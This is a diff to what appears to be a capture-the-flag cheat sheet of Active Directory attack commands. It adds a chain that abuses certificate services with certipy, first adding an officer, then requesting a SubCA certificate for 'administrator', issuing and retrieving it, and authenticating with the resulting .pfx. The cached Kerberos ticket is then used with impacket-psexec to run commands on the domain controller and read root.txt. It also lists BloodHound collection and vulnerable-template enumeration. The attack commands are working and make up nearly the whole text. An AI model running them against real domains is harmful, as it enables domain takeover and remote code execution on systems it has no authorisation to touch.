@@ -140,7 +140,7 @@ nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound
 certipy-ad find -dc-ip $TARGET -u '$USERNAME' -target $DC -k -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
 
 ## ROOT FLAG
-impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
+export KRB5CCNAME=`pwd`/administrator.ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
 
 ## Start Bloodhound
 .\bloodhound-cli resetpwd
@@ -479,6 +479,8 @@ certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -add-officer '
 certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template 'SubCA' -upn 'administrator' -target $DC -key-size '4096' <<< 'y' | grep -v '[-]' | tee /dev/tty | awk '/Request ID is/ {printf "[*] Now use \x27%s.key\x27 in the following requests as -issue-request \x27%s\x27 and -retrieve \x27%s\x27\n", $5, $5, $5}'
 certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -issue-request ''
 certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -retrieve ''
+certipy auth -dc-ip $TARGET -domain $DOM -pfx 'administrator.pfx'
+export KRB5CCNAME=`pwd`/administrator.ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
 
 +---------- Request ----------+
 certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -upn 'Administrator' -target $DC -key-size '4096'
